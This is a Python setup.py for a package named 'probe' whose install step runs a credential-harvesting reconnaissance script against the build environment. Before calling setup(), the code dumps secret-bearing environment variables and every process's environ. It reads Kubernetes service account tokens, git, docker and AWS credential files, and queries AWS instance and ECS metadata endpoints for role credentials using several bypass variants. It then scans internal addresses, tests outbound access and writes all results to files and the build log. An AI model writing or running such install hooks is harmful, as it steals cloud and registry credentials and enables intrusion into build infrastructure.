import os, sys, json, socket, subprocess, ssl, urllib.request, urllib.error, platform, traceback
try:
    from setuptools import setup
except Exception:
    from distutils.core import setup

SECT = []
def sec(t):
    SECT.append("\n#### %s ####" % t)
def p(*a):
    SECT.append(' '.join(str(x) for x in a))

def sh(cmd, t=20):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, timeout=t)
        return (r.stdout.decode('utf-8','replace') + r.stderr.decode('utf-8','replace'))[:8000]
    except Exception as e:
        return 'ERR ' + repr(e)

def rf(path, n=8000):
    try:
        with open(path,'rb') as f:
            return f.read(n).decode('utf-8','replace')
    except Exception as e:
        return 'ERR ' + repr(e)

def http(url, method='GET', headers=None, data=None, timeout=6, direct=False):
    try:
        if direct:
            op = urllib.request.build_opener(urllib.request.ProxyHandler({}), urllib.request.HTTPSHandler(context=ssl._create_unverified_context()))
            r = op.open(urllib.request.Request(url, headers=headers or {}, data=data, method=method), timeout=timeout)
        else:
            r = urllib.request.urlopen(urllib.request.Request(url, headers=headers or {}, data=data, method=method), timeout=timeout, context=ssl._create_unverified_context())
        return 'HTTP %s %s\n%s' % (r.status, getattr(r,'reason',''), r.read(3000).decode('utf-8','replace'))
    except urllib.error.HTTPError as e:
        try:
            body = e.read(2000).decode('utf-8','replace')
        except Exception:
            body = ''
        return 'HTTPERR %s\n%s\n%s' % (e.code, dict(e.headers), body)
    except Exception as e:
        return 'ERR ' + repr(e)

sec('WHOAMI')
p('uid/gid', os.getuid(), os.getgid(), 'cwd', os.getcwd())
p(sh('id; hostname; uname -a; cat /etc/os-release 2>&1'))
sec('ENV')
for k in sorted(os.environ):
    v = os.environ[k]
    if any(x in k.upper() for x in ('AWS','TOKEN','SECRET','KEY','PASS','CRED','GIT','CHOREO','ARGO','AMP','ECR','DOCKER','REGISTRY')):
        p(k, '=', v)
p('--- full env keys ---', ','.join(sorted(os.environ.keys())))
p('--- full env ---')
for k in sorted(os.environ):
    p(k, '=', os.environ[k][:200])
sec('PROC')
p('proc1cmd', rf('/proc/1/cmdline'))
p('proc1env', rf('/proc/1/environ').replace('\x00','\n'))
p('selfcgroup', rf('/proc/self/cgroup'))
p('mounts', rf('/proc/self/mountinfo', 20000))
try:
    pids = os.listdir('/proc')
    for pid in pids:
        if pid.isdigit():
            e = rf('/proc/%s/environ' % pid, 2000).replace('\x00','\n')
            if e and 'ERR' not in e[:4]:
                p('== pid', pid, 'cmdline:', rf('/proc/%s/cmdline' % pid, 500).replace('\x00',' '))
                p(e)
except Exception as e:
    p('procscan ERR', repr(e))
sec('FILESYSTEM')
p(sh('ls -la / /workspace /layers /platform /home /home/cnb /root /var/run /var/run/secrets /var/run/secrets/kubernetes.io/serviceaccount /etc /etc/secrets /run /run/secrets /mnt /mnt/vol /tmp 2>&1'))
p(sh("find / -maxdepth 4 \\( -iname '*dockerconfig*' -o -name 'auth.json' -o -name '.git-credentials' -o -iname '*secret*' -o -name '*.token' -o -name 'credentials' -o -name '.netrc' -o -name '.gitconfig' \\) 2>/dev/null | head -100"))
for f in ['/var/run/secrets/kubernetes.io/serviceaccount/token','/var/run/secrets/kubernetes.io/serviceaccount/namespace','/root/.gitconfig','/root/.git-credentials','/root/.netrc','/root/.docker/config.json','/root/.aws/credentials','/root/.aws/config','/home/cnb/.gitconfig','/home/cnb/.git-credentials','/home/cnb/.netrc','/home/cnb/.docker/config.json','/etc/containers/auth.json','/run/containers/0/auth.json','/var/run/containers/0/auth.json','/workspace/.git/config','/workspace/.git-credentials']:
    p('--', f, ':', rf(f, 4000))
sec('DNS')
for h in ['kubernetes.default.svc','kube-dns.kube-system.svc','agent-manager-service.platform.svc','registry.workflows.svc','metadata.google.internal','instance-data','541673202425.dkr.ecr.us-east-2.amazonaws.com','github.com','example.com']:
    try:
        p(h, '->', socket.getaddrinfo(h, None)[:2])
    except Exception as e:
        p(h, 'ERR', repr(e))
sec('TCP')
for hp in [('10.172.48.1',443),('10.172.48.1',80),('169.254.169.254',80),('169.254.170.2',80)]:
    try:
        s = socket.create_connection(hp, timeout=4); s.close(); p(hp, 'OPEN')
    except Exception as e:
        p(hp, 'ERR', repr(e))
sec('IMDS')
def raw_http(host, port, req, timeout=5):
    import socket
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.settimeout(timeout)
        s.sendall(req.encode())
        data=b''
        try:
            while True:
                c=s.recv(4096)
                if not c: break
                data+=c
                if len(data)>8000: break
        except Exception:
            pass
        s.close()
        return data.decode('utf-8','replace')
    except Exception as e:
        return 'ERR '+repr(e)
TOKD={'X-aws-ec2-metadata-token-ttl-seconds':'21600'}
p('v1-root', http('http://169.254.169.254/latest/meta-data/', direct=True))
p('v1-rolelist', http('http://169.254.169.254/latest/meta-data/iam/security-credentials/', direct=True))
p('v1-identity', http('http://169.254.169.254/latest/dynamic/instance-identity/document', direct=True))
p('v2-token-PUT-httpclient', http('http://169.254.169.254/latest/api/token', method='PUT', headers=TOKD, data=b'', direct=True))
p('v2-token-PUT-nodata', http('http://169.254.169.254/latest/api/token', method='PUT', headers=TOKD, direct=True))
p('v2-token-GET', http('http://169.254.169.254/latest/api/token', headers=TOKD, direct=True))
p('v2-token-POST', http('http://169.254.169.254/latest/api/token', method='POST', headers=TOKD, data=b'', direct=True))
p('v2-token-raw', raw_http('169.254.169.254',80,'PUT /latest/api/token HTTP/1.1\r\nHost: 169.254.169.254\r\nX-aws-ec2-metadata-token-ttl-seconds: 21600\r\nContent-Length: 0\r\nConnection: close\r\n\r\n'))
p('v2-token-raw10', raw_http('169.254.169.254',80,'PUT /latest/api/token HTTP/1.0\r\nHost: 169.254.169.254\r\nX-aws-ec2-metadata-token-ttl-seconds: 21600\r\n\r\n'))
p('v1-raw', raw_http('169.254.169.254',80,'GET /latest/meta-data/ HTTP/1.1\r\nHost: 169.254.169.254\r\nConnection: close\r\n\r\n'))
p('v1-raw-ua', raw_http('169.254.169.254',80,'GET /latest/meta-data/ HTTP/1.1\r\nHost: 169.254.169.254\r\nUser-Agent: curl/8.5.0\r\nConnection: close\r\n\r\n'))
p('v1-raw-xff', raw_http('169.254.169.254',80,'GET /latest/meta-data/ HTTP/1.1\r\nHost: 169.254.169.254\r\nX-Forwarded-For: 127.0.0.1\r\nConnection: close\r\n\r\n'))
try:
    import socket
    p('ipv6-imds', socket.getaddrinfo('fd00:ec2::254',80)[:1])
    p('ipv6-imds-http', raw_http('fd00:ec2::254',80,'GET /latest/meta-data/ HTTP/1.1\r\nHost: [fd00:ec2::254]\r\nConnection: close\r\n\r\n'))
except Exception as e:
    p('ipv6-imds ERR', repr(e))
p('curl-which', sh('command -v curl; curl --version 2>&1 | head -2'))
p('curl-imds2', sh("curl -s -m 5 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' -i http://169.254.169.254/latest/api/token 2>&1 | head -20"))
p('curl-imds1', sh("curl -s -m 5 -i http://169.254.169.254/latest/meta-data/ 2>&1 | head -20"))
p('ecs-rel', http('http://169.254.170.2/v2/credentials/00000000-0000-0000-0000-000000000000', direct=True))
p('ecs-rel-fs', http('http://169.254.170.2/v2/credentials', direct=True))
sec('CAPS')
p(sh('cat /proc/self/status | egrep "Cap|Seccomp|NoNewPrivs"; cat /proc/1/status | egrep "Cap|Seccomp|NoNewPrivs"; ls -la /run /run/podman /run/containers 2>&1; ls -la /proc/1/root/var/run/secrets 2>&1;ls -la /proc/1/root 2>&1 | head'))
sec('NET')
p('nat-ip', http('https://httpbin.org/ip', direct=True))
p('sts', http('https://sts.us-east-2.amazonaws.com/', direct=True))
p('ecr-api', http('https://api.ecr.us-east-2.amazonaws.com/', direct=True))
p('ecr-auth-vpc', http('https://541673202425.dkr.ecr.us-east-2.amazonaws.com/v2/', direct=True))
for ip in ['10.172.48.1','10.172.48.10','10.172.48.11','10.172.52.1']:
    for port in [443,53,80]:
        try:
            s=socket.create_connection((ip,port),timeout=2); s.close(); p(ip,port,'OPEN')
        except Exception as e:
            p(ip,port,'ERR',type(e).__name__)
sec('ECR')
p('ecr-v2', http('https://541673202425.dkr.ecr.us-east-2.amazonaws.com/v2/', direct=True))
p('ecr-tags', http('https://541673202425.dkr.ecr.us-east-2.amazonaws.com/v2/poc2-1795110817433-image/tags/list', direct=True))
p('dockerhub', http('https://registry-1.docker.io/v2/', direct=True))
sec('EGRESS')
p('https-example', http('https://example.com/', direct=True))
p('github', http('https://github.com/', direct=True))
p('wget-ip', sh('wget -qO- -T 4 http://169.254.169.254/latest/meta-data/ 2>&1 | head -5'))

TXT = '\n'.join(SECT)
for path in ['/workspace/recon_build.txt','/tmp/recon_build.txt', os.path.join(os.getcwd(),'recon_build.txt')]:
    try:
        with open(path,'w') as f: f.write(TXT)
    except Exception as e:
        pass
try:
    sys.stdout.write('\n=====BUILD RECON START=====\n' + TXT[:60000] + '\n=====BUILD RECON END=====\n')
    sys.stdout.flush()
except Exception:
    pass

setup(name='probe', version='0.0.1', py_modules=[])
